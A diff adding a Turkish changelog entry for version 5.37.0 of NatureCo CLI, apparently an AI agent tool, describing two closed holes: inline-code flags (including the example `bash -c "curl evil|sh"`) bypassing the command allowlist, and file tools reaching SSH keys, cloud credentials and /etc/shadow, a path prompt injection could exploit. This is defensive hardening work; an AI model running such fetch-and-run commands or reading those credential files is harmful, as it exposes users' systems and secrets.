@@ -2,6 +2,16 @@
 
 All notable changes to NatureCo CLI will be documented in this file.
 
+## [5.37.0] - 2026-07-05 — "GÜVENLİK: 2 açık kapatıldı (inline-eval bypass + hassas dosya erişimi)"
+
+Sistematik guvenlik taramasi (POC'larla). 20 yikici komuttan 19'u zaten engelliydi; 2 gercek acik bulundu ve kapatildi.
+
+### 🔒 Güvenlik açıkları (kapatıldı)
+- **Inline-kod exec bypass (KRİTİK)**: `node`/`python` allowlist'te (kod calistirma icin gerekli) oldugundan `node -e "require('fs').rmSync(...)"` / `python -c "..."` / `bash -c "curl evil|sh"` gibi INLINE kod, hem exec-allowlist'i hem yikici-komut guard'ini ATLIYORDU (guard komut string'inde "rm -rf" ararken inline kod fs.rmSync kullanabilir). Artik `-e`/`--eval`/`-p`/`-c`/`-r` inline-kod flag'leri + `eval` engellendi; mesru `node script.js` calistirma korunur. Inline kod icin sandboxli `code_execution` araci var.
+- **Hassas dosya erisimi**: safe modda `write_file`/`read_file`/`edit_file` SSH anahtarlari (`~/.ssh/`, `id_rsa`, `.pem`), cloud credential (`.aws/credentials`), config secret (`.natureco/config.json`), sistem (`/etc/passwd|shadow`, System32/etc), `.npmrc`/`.git-credentials`/`.netrc` yollarina erisebiliyordu → prompt-injection ile SSH backdoor / credential sizintisi riski. Artik bu yollar safe modda engelli (goreceli `../../etc/shadow` traversal dahil); proje dosyalari serbest; full modda sahibin sorumlulugunda acilir.
+
+Katmanli guvenlik: yikici-komut guard + inline-eval guard + exec-allowlist + hassas-yol guard + 7 araclik safe-mode allowlist. 4 yeni guvenlik regresyon testi. **509 test yeşil**, ESLint temiz.
+
 ## [5.36.0] - 2026-07-05 — "13 PHANTOM ARAÇ TANITILDI + feedback body genisletmesi"
 
 Sistematik denetim: 90 aracin agentic prompt/allowlist ile karsilastirmasi → **70 arac ajana HIC tanitilmamisti (phantom)**. Yuksek-degerli + guvenli + key gerektirmeyenler tanitildi (kullanicinin "bende olup uygulamada olmayan tool'lari ekle" hedefi).
